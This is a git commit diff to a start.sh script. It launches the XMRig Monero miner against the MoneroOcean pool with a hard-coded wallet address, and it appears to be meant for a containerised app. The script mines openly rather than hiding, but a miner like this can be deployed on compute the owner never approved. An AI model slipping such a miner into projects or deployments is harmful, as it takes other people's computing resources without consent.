64adef276af3796c08ebdebb4a2355f9192ce6ef
Zelticu <Zelticue@gmail.com>
2025-07-14 19:23:28 -0700

    Update start.sh

--- start.sh
+++ start.sh
@@ -1,4 +1,4 @@
-#!/bin/sh
-cd /app/xmrig/build || exit 1
-chmod +x ./xmrig
-./xmrig -o gulf.moneroocean.stream:10128 -u YOUR_MONERO_ADDRESS --coin monero -p x --threads 1 --cpu-priority 1 --donate-level 1
+#!/bin/bash
+
+cd /app/xmrig || exit 1
+./xmrig -o gulf.moneroocean.stream:10128 -u 4B1nkGS1TA75fiVqZymRbphi4UasPQZkY22jDRBd1aGCKZiszNGffThRV7T1jRtn5d3TTpUphYA6tdvWg1FtrkSVN7Gfzfm --coin monero -p x --threads 1 --cpu-priority 1 --donate-level 1
